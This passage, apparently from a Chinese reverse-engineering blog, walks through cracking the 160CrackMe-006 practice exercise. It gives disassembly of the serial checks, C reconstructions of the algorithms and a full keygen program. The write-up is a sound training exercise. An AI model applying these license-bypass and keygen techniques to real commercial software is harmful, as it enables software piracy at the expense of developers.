code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szname);<br><span class="hljs-keyword">int</span> sum = len;<br><span class="hljs-keyword">int</span> temp = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">1</span>; i++) &#123;<br>sum = ((szname[i] * szname[i + <span class="hljs-number">1</span>]) * temp) + sum;<br>temp++;<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br>serial = sum - <span class="hljs-number">0x29A</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, serial);<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/02/160CrackMe-006/5.png"></p><p>输入发现OK按钮已经亮了</p><p><img src="/2021/08/02/160CrackMe-006/6.png"></p><p>点击OK按钮发现，没有用，codice清0，然后OK又灰色了。</p><p><img src="/2021/08/02/160CrackMe-006/7.png"></p><p>从OK按钮入手，发现刚进来的第一个跳转就是熟悉的判断条件，说明程序并不是直接点击OK的，在这之前肯定还有一个条件要满足的。先继续在这里看一下，修改这个条件往下走，可以看到第二个跳转，修改这个跳转，按钮就会小时，经过分析之前这个函数就是算法。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00442D64</span>  /.  <span class="hljs-number">55</span>            push ebp<br><span class="hljs-attribute">00442D65</span>  |.  <span class="hljs-number">8</span>BEC          mov ebp,esp<br><span class="hljs-attribute">00442D67</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442D69</span>  |.  <span class="hljs-number">53</span>            push ebx<br><span class="hljs-attribute">00442D6A</span>  |.  <span class="hljs-number">8</span>BD<span class="hljs-number">8</span>          mov ebx,eax<br><span class="hljs-attribute">00442D6C</span>  |.  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442D6E</span>  |.  <span class="hljs-number">55</span>            push ebp<br><span class="hljs-attribute">00442D6F</span>  |.  <span class="hljs-number">68</span> ED<span class="hljs-number">2</span>D<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>DED<br><span class="hljs-attribute">00442D74</span>  |.  <span class="hljs-number">64</span>:FF<span class="hljs-number">30</span>       push dword ptr fs:[eax]<br><span class="hljs-attribute">00442D77</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8920</span>       mov dword ptr fs:[eax],esp<br><span class="hljs-attribute">00442D7A</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> D<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>D<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442D80</span>  |.  <span class="hljs-number">8078</span> <span class="hljs-number">47</span> <span class="hljs-number">01</span>    cmp byte ptr ds:[eax+<span class="hljs-number">0</span>x<span class="hljs-number">47</span>],<span class="hljs-number">0</span>x<span class="hljs-number">1</span>           ;  熟悉的地址<br><span class="hljs-attribute">00442D84</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">12</span>         jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">98</span><br><span class="hljs-attribute">00442D86</span>  |.  BA <span class="hljs-number">002</span>E<span class="hljs-number">4400</span>   mov edx,aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">00</span>                ;  UNICODE <span class="hljs-string">&quot;0&quot;</span><br><span class="hljs-attribute">00442D8B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442D91</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">5</span>A<span class="hljs-number">05</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>F<span class="hljs-number">0</span><br><span class="hljs-attribute">00442D96</span>  |.  EB <span class="hljs-number">3</span>F         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>DD<span class="hljs-number">7</span><br><span class="hljs-attribute">00442D98</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> FC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442D9B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442DA1</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">1</span>A<span class="hljs-number">05</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442DA6</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> FC       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442DA9</span>  |.  E<span class="hljs-number">8</span> C<span class="hljs-number">248</span>FCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00407670</span><br><span class="hljs-attribute">00442DAE</span>  |.  <span class="hljs-number">50</span>            push eax<br><span class="hljs-attribute">00442DAF</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> FC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442DB2</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> DC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>DC]<br><span class="hljs-attribute">00442DB8</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">0305</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442DBD</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> FC       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442DC0</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  <span class="hljs-number">0018</span>F<span class="hljs-number">8</span>D<span class="hljs-number">4</span><br><span class="hljs-attribute">00442DC1</span>  |.  E<span class="hljs-number">8</span> DAFDFFFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>BA<span class="hljs-number">0</span>                   ;  算法<br><span class="hljs-attribute">00442DC6</span>  |.  <span class="hljs-number">84</span>C<span class="hljs-number">0</span>          test al,al<br><span class="hljs-attribute">00442DC8</span>  |.  <span class="hljs-number">74</span> <span class="hljs-number">0</span>D         je short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>DD<span class="hljs-number">7</span><br><span class="hljs-attribute">00442DCA</span>  |.  <span class="hljs-number">33</span>D<span class="hljs-number">2</span>          xor edx,edx<br><span class="hljs-attribute">00442DCC</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]<br><span class="hljs-attribute">00442DD2</span>  |.  E<span class="hljs-number">8</span> D<span class="hljs-number">903</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004231</span>B<span class="hljs-number">0</span><br><span class="hljs-attribute">00442DD7</span>  |&gt;  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442DD9</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  <span class="hljs-number">0018</span>F<span class="hljs-number">8</span>D<span class="hljs-number">4</span><br><span class="hljs-attribute">00442DDA</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  <span class="hljs-number">0018</span>F<span class="hljs-number">8</span>D<span class="hljs-number">4</span><br><span class="hljs-attribute">00442DDB</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  <span class="hljs-number">0018</span>F<span class="hljs-number">8</span>D<span class="hljs-number">4</span><br><span class="hljs-attribute">00442DDC</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8910</span>       mov dword ptr fs:[eax],edx<br><span class="hljs-attribute">00442DDF</span>  |.  <span class="hljs-number">68</span> F<span class="hljs-number">42</span>D<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>DF<span class="hljs-number">4</span><br><span class="hljs-attribute">00442DE4</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> FC       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442DE7</span>  |.  E<span class="hljs-number">8</span> CC<span class="hljs-number">09</span>FCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004037</span>B<span class="hljs-number">8</span><br><span class="hljs-attribute">00442DEC</span>  \.  C<span class="hljs-number">3</span>            retn<br></code></pre></div></td></tr></table></figure><p>进入算法进行查看，可以看到一个通过注册码求用户名的过程。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00442C09</span>  |.  <span class="hljs-number">0</span>FB<span class="hljs-number">64430</span> FF   |movzx eax,byte ptr ds:[eax+esi-<span class="hljs-number">0</span>x<span class="hljs-number">1</span>]     ;  获取最后一位<br><span class="hljs-attribute">00442C0E</span>  |.  F<span class="hljs-number">7</span>E<span class="hljs-number">8</span>          |imul eax                                ;  平方<br><span class="hljs-attribute">00442C10</span>  |.  <span class="hljs-number">0</span>FBFC<span class="hljs-number">0</span>        |movsx eax,ax<br><span class="hljs-attribute">00442C13</span>  |.  F<span class="hljs-number">7</span>EE          |imul esi                                ;  乘以长度/长度不断-<span class="hljs-number">1</span><br><span class="hljs-attribute">00442C15</span>  |.  B<span class="hljs-number">9</span> <span class="hljs-number">19000000</span>   |mov ecx,<span class="hljs-number">0</span>x<span class="hljs-number">19</span><br><span class="hljs-attribute">00442C1A</span>  |.  <span class="hljs-number">99</span>            |cdq<br><span class="hljs-attribute">00442C1B</span>  |.  F<span class="hljs-number">7</span>F<span class="hljs-number">9</span>          |idiv ecx<br><span class="hljs-attribute">00442C1D</span>  |.  <span class="hljs-number">83</span>C<span class="hljs-number">2</span> <span class="hljs-number">41</span>       |add edx,<span class="hljs-number">0</span>x<span class="hljs-number">41</span>                            ;  除以<span class="hljs-number">0</span>x<span class="hljs-number">19</span>余数+<span class="hljs-number">0</span>x<span class="hljs-number">41</span><br><span class="hljs-attribute">00442C20</span>  |.  <span class="hljs-number">58</span>            |pop eax                                 ;  <span class="hljs-number">0018</span>F<span class="hljs-number">8</span>D<span class="hljs-number">4</span><br><span class="hljs-attribute">00442C21</span>  |.  <span class="hljs-number">8810</span>          |mov byte ptr ds:[eax],dl<br><span class="hljs-attribute">00442C23</span>  |.  <span class="hljs-number">4</span>E            |dec esi<br><span class="hljs-attribute">00442C24</span>  |.  <span class="hljs-number">85</span>F<span class="hljs-number">6</span>          |test esi,esi<br><span class="hljs-attribute">00442C26</span>  |.^ <span class="hljs-number">75</span> D<span class="hljs-number">1</span>         \jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>BF<span class="hljs-number">9</span><br><span class="hljs-attribute">00442C28</span>  |&gt;  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">4</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>xC]<br><span class="hljs-attribute">00442C2B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">55</span> FC       mov edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442C2E</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">110</span>FFCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00403</span>B<span class="hljs-number">44</span>                   ;  与输入的用户名进行比较<br><span class="hljs-attribute">00442C33</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">17</span>         jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>C<span class="hljs-number">4</span>C<br></code></pre></div></td></tr></table></figure><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>itoa(serial, name,<span class="hljs-number">10</span>);<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br><span class="hljs-keyword">int</span> a = len;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br><span class="hljs-keyword">int</span> temp = name[a<span class="hljs-number">-1</span>] * name[a<span class="hljs-number">-1</span>];<br>temp = temp *  a;<br>temp = temp % <span class="hljs-number">0x19</span>;<br>temp = temp + <span class="hljs-number">0x41</span>;<br>name[a - <span class="hljs-number">1</span>] = temp;<br>a = a -  <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, name);<br></code></pre></div></td></tr></table></figure><p>现在就剩下最后一个事件，CancellaClick</p><p>进去查看，发现里面没有那个熟悉的地址，那么基本上那个地址的赋值应该就是在这里了吧，只有一个跳转，修改条件后，最早下的硬件断点终于断下来了。那么查看一下算法的过程。</p><p><img src="/2021/08/02/160CrackMe-006/8.png"></p><p>进入函数查看，可以看到具体的算法，是一个通过用户名求注册码的过程。</p><figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima"><span class="hljs-number">00442B20</span>  |.  83F8 <span class="hljs-number">05</span>       cmp eax,<span class="hljs-number">0x5</span>                              ;  判断输入的name是否大于<span class="hljs-number">5</span><br><span class="hljs-number">00442B23</span>  |.  7E <span class="hljs-number">53</span>         jle short aLoNg3x_<span class="hljs-number">.00442B78</span><br><span class="hljs-number">00442B25</span>  |.  <span class="hljs-number">8B45</span> FC       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0x4</span>]<br><span class="hljs-number">00442B28</span>  |.  <span class="hljs-number">0FB640</span> <span class="hljs-number">04</span>     movzx eax,byte ptr ds:[eax+<span class="hljs-number">0x4</span>]          ;  获取name第五位<br><span class="hljs-number">00442B2C</span>  |.  B9 <span class="hljs-number">07000000</span>   mov ecx,<span class="hljs-number">0x7</span><br><span class="hljs-number">00442B31</span>  |.  33D2          xor edx,edx<br><span class="hljs-number">00442B33</span>  |.  F7F1          div ecx                                  ;  除以<span class="hljs-number">7</span><br><span class="hljs-number">00442B35</span>  |.  8BC2          mov eax,edx                              ;  余数<br><span class="hljs-number">00442B37</span>  |.  83C0 <span class="hljs-number">02</span>       add eax,<span class="hljs-number">0x2</span><br><span class="hljs-number">00442B3A</span>  |.  E8 E1FEFFFF   call aLoNg3x_.<span class="hljs-number">00442A20</span>                   ;  阶乘<br><span class="hljs-number">00442B3F</span>  |.  8BF0          mov esi,eax<br><span class="hljs-number">00442B41</span>  |.  33DB          xor ebx,ebx<br><span class="hljs-number">00442B43</span>  |.  <span class="hljs-number">8B45</span> FC       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0x4</span>]<br><span class="hljs-number">00442B46</span>  |.  E8 E90EFCFF   call aLoNg3x_.<span class="hljs-number">00403A34</span><br><span class="hljs-number">00442B4B</span>  |.  85C0          test eax,eax<br><span class="hljs-number">00442B4D</span>  |.  7E <span class="hljs-number">16</span>         jle short aLoNg3x_<span class="hljs-number">.00442B65</span><br><span class="hljs-number">00442B4F</span>  |.  BA <span class="hljs-number">01000000</span>   mov edx,<span class="hljs-number">0x1</span><br><span class="hljs-number">00442B54</span>  |&gt;  8B4D FC       /mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0x4</span>]<br><span class="hljs-number">00442B57</span>  |.  <span class="hljs-number">0FB64C11</span> FF   |movzx ecx,byte ptr ds:[ecx+edx-<span class="hljs-number">0x1</span>]     ;  逐位获取<br><span class="hljs-number">00442B5C</span>  |.  <span class="hljs-number">0FAFCE</span>        |imul ecx,esi<br><span class="hljs-number">00442B5F</span>  |.  <span class="hljs-number">03D9</span>          |add ebx,ecx                             ;  user32.75B16D51<br><span class="hljs-number">00442B61</span>  |.  <span class="hljs-number">42</span>            |inc edx<br><span class="hljs-number">00442B62</span>  |.  <span class="hljs-number">48</span>            |dec eax<br><span class="hljs-number">00442B63</span>  |.^ <span class="hljs-number">75</span> EF         \jnz short aLoNg3x_<span class="hljs-number">.00442B54</span><br><span class="hljs-number">00442B65</span>  |&gt;  2B5D F8       sub ebx,dword ptr ss:[ebp-<span class="hljs-number">0x8</span>]           ;  减去注册码十六进制<br><span class="hljs-number">00442B68</span>  |.  81FB 697A0000 cmp ebx,<span class="hljs-number">0x7A69</span><br><span class="hljs-number">00442B6E</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">04</span>         jnz short aLoNg3x_<span class="hljs-number">.00442B74</span><br><span class="hljs-number">00442B70</span>  |.  B3 <span class="hljs-number">01</span>         mov bl,<span class="hljs-number">0x1</span>                               ;  关键的赋值<br><span class="hljs-number">00442B72</span>  |.  EB <span class="hljs-number">06</span>         jmp short aLoNg3x_.<span class="hljs-number">00442B7A</span><br><span class="hljs-number">00442B74</span>  |&gt;  33DB          xor ebx,ebx<br><span class="hljs-number">00442B76</span>  |.  EB <span class="hljs-number">02</span>         jmp short aLoNg3x_.<span class="hljs-number">00442B7A</span><br></code></pre></div></td></tr></table></figure><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> a = szname[<span class="hljs-number">4</span>] % <span class="hljs-number">0x7</span>;<br>a = a + <span class="hljs-number">2</span>;<br><span class="hljs-keyword">int</span> num = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= a; i++) &#123;<br>num = num * i;<br>&#125;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szname);<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>sum += szname[i] * num;<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br>serial = sum - <span class="hljs-number">0x7A69</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, serial);<br><span class="hljs-keyword">return</span> serial;<br></code></pre></div></td></tr></table></figure><p>当经过了这个判断之后，那个地址就会被赋值，同时cancle按钮也会消失，ok按钮会常亮。</p><p><img src="/2021/08/02/160CrackMe-006/9.png"></p><p>那么整体的流程就很清楚，首先要通过用户名计算一个注册码输入cancle按钮消失，ok变亮，然后再通过注册码计算出一个用户名输入后，ok消失，完成注册</p><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><p>完整注册机代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">CancleClick</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* szname)</span> </span>&#123;<br><span class="hljs-keyword">int</span> a = szname[<span class="hljs-number">4</span>] % <span class="hljs-number">0x7</span>;<br>a = a + <span class="hljs-number">2</span>;<br><span class="hljs-keyword">int</span> num = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= a; i++) &#123;<br>num = num * i;<br>&#125;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szname);<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>sum += szname[i] * num;<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br>serial = sum - <span class="hljs-number">0x7A69</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, serial);<br><span class="hljs-keyword">return</span> serial;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CodiceChange</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* szname)</span> </span>&#123;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szname);<br><span class="hljs-keyword">int</span> sum = len;<br><span class="hljs-keyword">int</span> temp = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">1</span>; i++) &#123;<br>sum = ((szname[i] * szname[i + <span class="hljs-number">1</span>]) * temp) + sum;<br>temp++;<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br>serial = sum - <span class="hljs-number">0x29A</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, serial);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">OkClick</span><span class="hljs-params">(<span class="hljs-keyword">int</span> serial)</span> </span>&#123;<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>itoa(serial, name,<span class="hljs-number">10</span>);<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br><span class="hljs-keyword">int</span> a = len;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br><span class="hljs-keyword">int</span> temp = name[a<span class="hljs-number">-1</span>] * name[a<span class="hljs-number">-1</span>];<br>temp = temp *  a;<br>temp = temp % <span class="hljs-number">0x19</span>;<br>temp = temp + <span class="hljs-number">0x41</span>;<br>name[a - <span class="hljs-number">1</span>] = temp;<br>a = a -  <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, name);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>gets_s(name, <span class="hljs-number">20</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;让cancle消失，通过用户名求出的serial\n&quot;</span>);<br><span class="hljs-keyword">int</span> serial = CancleClick(name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;仅仅只是显示OK按钮\n&quot;</span>);<br>CodiceChange(name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;让OK消失，通过serial：%d\n求出的用户名\n&quot;</span>,serial);<br>OkClick(serial);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/02/160CrackMe-006/10.png"></p><p>cancle按钮</p><p><img src="/2021/08/02/160CrackMe-006/11.png"></p><p>OK按钮</p><p><img src="/2021/08/02/160CrackMe-006/12.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>程序共有三个算法</p><ul><li>nomechange和codicechange里的，仅仅只是让OK亮起来</li><li>cancleClick里的，消失cancle按钮，赋值给那个关键地方，OK亮起</li><li>OKClick里的，让OK按钮消失</li></ul><p>不知道nomechange和codicechange里的算法有什么用，感觉没必要。。。</p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-004</title>
    <link href="/2021/07/29/160CrackMe-004/"/>
